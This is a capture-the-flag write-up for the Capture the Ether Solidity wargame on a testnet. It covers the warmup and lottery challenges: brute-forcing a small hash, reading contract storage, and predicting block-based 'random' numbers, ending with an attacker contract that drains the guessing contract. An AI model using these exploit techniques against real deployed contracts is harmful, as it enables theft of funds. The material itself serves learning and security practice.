# Capture the Ether

> [Capture the Ether](https://capturetheether.com/challenges/) is a game in which you hack Ethereum smart contracts to learn about security.

This game is brought to you by [@smarx](https://twitter.com/smarx).

# Disclaimer

As I am new to Solidity, I might have made some mistakes here.

That could be regarding the way I dealt with some challenges or regarding technical terms I (didn't) used.

I strongly encourage you to double check the information below and send an issue / PR if there is anything not fairly accurate or if you find a prettier workaround !

That being said, `Lets a go !` :fist:

# Challenge Quests !

> Time for a true display of skill !

## Warmup

### Deploy a contract

All you have to do is to install [Metamask](https://metamask.io/), and switch to the Ropsten test network. Next step :point_right: go to [Metamask faucet](https://faucet.metamask.io/) in order to get some free Ether.
When you click the `Begin Challenge` button, metamask will be triggered and you'll be asked to send the transaction in order to deploy the contract.

Nailed it :tada:

### Call me

In order to call the function on the deployed contract, I used [Remix](https://remix.ethereum.org/) wich is pretty easy to operate.

You just have to create a file where you copy/paste the contract given on Capture the Ether website. Compile it and go to the Run tab, in the second block section you can load a contract from an existing address or deploy it. After pressing the `Begin Challenge` button, an address will be displayed, this is the one that you have to copy/paste into the `Load contract from Address` field and press the `At Address` button.

Then in the Deployed Contracts section you should be able to call the `callme()` function !

### Choose a nickname

Same thing as above, you just have to pass an argument next to the function call button.
Pretty easy.

## Lotteries

### Guess the number

>I’m thinking of a number. All you have to do is guess it.

```javascript

pragma solidity ^0.4.21;

contract GuessTheNumberChallenge {
    
    uint8 answer = 42;

    function GuessTheNumberChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);
        if (n == answer) {
            msg.sender.transfer(2 ether);
        }
    }

}
```

As we can see in this Solidity contract, the answer is stored as it in a state variable named `answer`.

> It's time to D-D-D-D-Duel !

That was really not a big deal to find that the number you were thinking of was ... 42 ! :sunglasses:

### Guess the secret number

>Putting the answer in the code makes things a little too easy.
>
>This time I’ve only stored the hash of the number. Good luck reversing a cryptographic hash!

```javascript
pragma solidity ^0.4.21;

contract GuessTheSecretNumberChallenge {
    bytes32 answerHash = 0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365;

    function GuessTheSecretNumberChallenge() public payable {
        require(msg.value == 1 ether);
    }
    
    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);

        if (keccak256(n) == answerHash) {
            msg.sender.transfer(2 ether);
        }
    }
}
```

As we can't reverse a cryptographic hash, the only way we can find it is brute forcing it.
Lucky us, we only have 256 possibilities ! ( because n is a uint8 so possible values goes from 0 to 255 ).

Keccak256 is an alias for sha3, so we can use the web3 sha3 function to calculate the hash !

Let's do it in our javascript console with a tiny script :

```javascript

const hash = "0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365"

for(i=0;i<256;i++){
  if(web3.sha3(i) == hash){
    console.log(i)
  }
}

```

> No result found !

NO GOD! PLEASE NO!!! What is going on ?

Well... the sha3 function of Solidity is taking arguments so it fits in the smallest necessary type. So we have to pass the argument as a uint8 ! In hexadecimal, we only need 2 characters in order to have 8 bits. So let's pass our argument as a hexadecimal number !

> Disclaimer : I had to do this workaround because I was using the version of Web3 provided by Metamask. You should consider using web3 1.0 with : `web3Utils.soliditySha3` function.

```javascript

const hash = "0xdb81b4d58595fbbbb592d3661a34cdca14d7ab379441400cbfa1b78bc447c365"

for(i=0;i<256;i++){
  // Don't forget to padLeft your number so it fits a 2 characters length
  if(web3.sha3(web3.padLeft(i.toString(16),2), {encoding: 'hex'}) == hash){
    console.log(i)
  }
}

```

> It's time to D-D-D-D-Duel !

I guess the number is ... 170 ! :sunglasses:

### Guess the random number

> This time the number is generated based on a couple fairly random sources.

```javascript
pragma solidity ^0.4.21;

contract GuessTheRandomNumberChallenge {
    uint8 answer;

    function GuessTheRandomNumberChallenge() public payable {
        require(msg.value == 1 ether);
        answer = uint8(keccak256(block.blockhash(block.number - 1), now));
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);

        if (n == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}
```

Well these sources are not really random.
As the answer is set in the constructor, the block variable refers to the block where the contract was created ( which is the block of the transaction you sent to create the contract ).

> But how do we find the `now` variable ? :thinking:

In Solidity, `now` is an alias for `block.timestamp`! :anguished:

We can see that we have to get block.blockhash(block.number - 1), which is the hash of the parent block.

So basically it means that we have to find :

``` javascript

block.blockhash(parentBlockNumber)
block.timestamp

```
We can do it with a little script in our javascript console.

``` javascript
// Put the transaction hash of the tx you sent in order to create the contract
var transactionHash = 'YOUR_TX_HASH';
// web3.eth.getTransaction retrieves a transaction information from hash
web3.eth.getTransaction(transactionHash, (err, transaction) => {
  // transaction.blockNumber gives us the block number
  var blockNumber = transaction.blockNumber;
  // web3.eth.getBlock retrieves a block from a block number
  web3.eth.getBlock(blockNumber, (err, block) => {
    // Here we have the block.timestamp
    var timestamp = block.timestamp;
    // And the hash of the parent block is stored in the block element, so we don't have to calculate it
    var parentBlockHash = block.parentHash;
    // Because now is a uint (so uint256 by default), we have to pad it so it fits the required length
    var answerHash = web3.sha3(parentBlockHash + web3.padLeft(timestamp.toString(16), 64), {encoding:'hex'});
    // Don't forget to put back the hexadimal prefix to the last two characters so web3.toDecimal can correctly convert the input
    console.log(web3.toDecimal("0x"+answerHash.slice(-2)));
  });
});

```

But there is another workaround, an easier one.
The Solidity doc says that [`Statically-sized variables (everything except mapping and dynamically-sized array types) are laid out contiguously in storage starting from position 0`](http://solidity.readthedocs.io/en/develop/miscellaneous.html).
As the contract only stores the answer as a state variable, we can get it using `web3.eth.getStorageAt` with the index `0`.

```javascript
var contract = 'ADDRESS_OF_DEPLOYED_CONTRACT';
// get storage at index 0
web3.eth.getStorageAt(contract, 0, (err, res) => {
  // We have to convert the hex number to decimal
  console.log(web3.toDecimal(res));
});
```

We did it ! :sunglasses:

### Guess the new number

> The number is now generated on-demand when a guess is made.

```javascript

pragma solidity ^0.4.21;

contract GuessTheNewNumberChallenge {
    function GuessTheNewNumberChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));

        if (n == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}

```

In this case we can't rely on a state variable. Every time we call the `guess` function, a new answer number is generated. But this number depends on the same datas we have seen before !
So we again have to find `block.blockhash(parentBlockNumber)` and `block.timestamp`.

> But how can we get the block of a pending transaction ? :thinking:

Well as transactions are stacked in a [txpool](https://github.com/ethereum/go-ethereum/wiki/Management-APIs#txpool), we don't know in which block they will be mined (we can bet that it will be added in the next pending block but we can't get the timestamp of it).

> Hopefully, when a contract makes an internal call to another contract, the block used in the internal call is the block of the main transaction. Knowing that, it is possible for us to call the `GuessTheNewRandomNumberChallenge` with the newly generated number.

```javascript
pragma solidity ^0.4.21;
// Declare an interface in order to use the GuessTheNewRandomNumberChallenge functions
interface GuessTheNewRandomNumberChallengeInterface {
    function guess(uint8) external payable;
}
/// @title The contract that we will use to call the GuessTheNewRandomNumberChallenge contract
contract CallingContract {
    // owner -> Store the owner of the contract so you will be able to get your ether back
    address public owner = msg.sender;
    /**
      * @notice Create a fallback function that is payable so the
      * GuessTheNewRandomNumberChallenge contract can send you back the Ether
      */
    function () public payable {}

    /**
      * @notice withdraw -> Bankrupt the contract, sending all Ether to owner
      */
    function withdraw() public {
        require(msg.sender == owner);
        owner.transfer(address(this).balance);
    }

    /**
      * @notice makeGuess -> Calls guess function at a given address
      * @param address The address of the deployed GuessTheNewRandomNumberChallenge contract
      */
    function makeGuess(address contractAddress) public payable {
        require(msg.value == 1 ether);
        GuessTheNewRandomNumberChallengeInterface challenge = GuessTheNewRandomNumberChallengeInterface(contractAddress);
        uint8 generatedAnswer = uint8(keccak256(block.blockhash(block.number - 1), now));
        challenge.guess.value(1 ether)(generatedAnswer);
    }
}
```
